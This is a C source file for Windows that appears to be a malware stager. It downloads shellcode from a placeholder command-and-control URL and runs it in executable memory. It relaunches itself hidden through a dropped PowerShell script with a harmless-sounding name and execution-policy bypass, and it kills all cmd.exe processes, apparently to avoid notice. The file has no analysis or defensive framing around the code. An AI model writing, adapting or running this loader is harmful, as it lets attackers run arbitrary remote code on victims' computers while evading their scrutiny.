#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <psapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "wininet.lib")

#define MEM_COMMIT 0x00001000
#define MEM_RESERVE 0x00002000
#define PAGE_EXECUTE_READWRITE 0x40

void* get_code(const char* url, size_t* size) {
    HINTERNET hInternet, hFile;
    DWORD bytesRead;
    BYTE* buffer;
    size_t bufferSize = 1024;
    size_t totalBytesRead = 0;

    hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        return NULL;
    }

    hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hFile == NULL) {
        InternetCloseHandle(hInternet);
        return NULL;
    }

    buffer = (BYTE*)malloc(bufferSize);
    if (buffer == NULL) {
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return NULL;
    }

    while (InternetReadFile(hFile, buffer + totalBytesRead, bufferSize - totalBytesRead, &bytesRead) && bytesRead > 0) {
        totalBytesRead += bytesRead;
        if (totalBytesRead >= bufferSize) {
            bufferSize *= 2;
            buffer = (BYTE*)realloc(buffer, bufferSize);
            if (buffer == NULL) {
                InternetCloseHandle(hFile);
                InternetCloseHandle(hInternet);
                return NULL;
            }
        }
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    *size = totalBytesRead;
    return buffer;
}

void load_shellcode(void* shellcode, size_t size) {
    void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem != NULL) {
        memcpy(execMem, shellcode, size);
        ((void(*)())execMem)();
    }
}

void terminate_cmd_processes() {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return;
    }

    do {
        if (_stricmp(pe32.szExeFile, "cmd.exe") == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
            }
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
}

void run_in_background() {
    char scriptPath[MAX_PATH];
    char tempPs1[MAX_PATH];
    char command[MAX_PATH + 100];
    FILE* ps1File;

    GetModuleFileName(NULL, scriptPath, MAX_PATH);
    GetTempPath(MAX_PATH, tempPs1);
    strcat(tempPs1, "system_check.ps1");

    ps1File = fopen(tempPs1, "w");
    if (ps1File != NULL) {
        fprintf(ps1File, "& \"%s\" --background", scriptPath);
        fclose(ps1File);
    }

    sprintf(command, "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File \"%s\"", tempPs1);
    ShellExecute(NULL, "open", "powershell.exe", command, NULL, SW_HIDE);
}

int main(int argc, char* argv[]) {
    if (argc < 2 || strcmp(argv[1], "--background") != 0) {
        run_in_background();
        terminate_cmd_processes();
        return 0;
    }

    // Running in background
    const char* url = "http://c2DomainName_or_IP/shellcode.bin";
    size_t size;
    void* shellcode = get_code(url, &size);
    if (shellcode != NULL) {
        load_shellcode(shellcode, size);
        free(shellcode);
    }

    return 0;
}
